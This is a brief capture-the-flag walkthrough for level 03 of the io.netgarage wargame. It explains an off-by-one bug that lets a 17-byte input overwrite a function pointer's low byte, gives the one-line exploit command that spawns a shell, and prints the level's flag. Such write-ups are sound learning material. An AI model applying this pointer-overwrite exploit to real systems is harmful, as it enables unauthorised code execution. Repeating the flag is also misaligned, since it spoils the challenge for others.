### Level 03
Let's get a copy of the stuff
`scp -P 2264 level1@io.netgarage.org:/levels/level03* .` with password from previous level
Looking through source, we've got a fencepost error on the for loop, allowing us to write 17 bytes into a 16 byte buffer. This 17th byte should over-write the LSB of the function pointer, allowing us to jump part way into f, where the win and shell are called.

So, looking through ida free, I think the we need to change the byte to "\x6e". 
Let's give it a shot.
`./level03 $(python -c 'print("AAAAAAAAAAAAAAAA"+"\x6e")')`
`WIN!` and we have our shell.
Flag is `raL6E8S0Y9BpioDK`
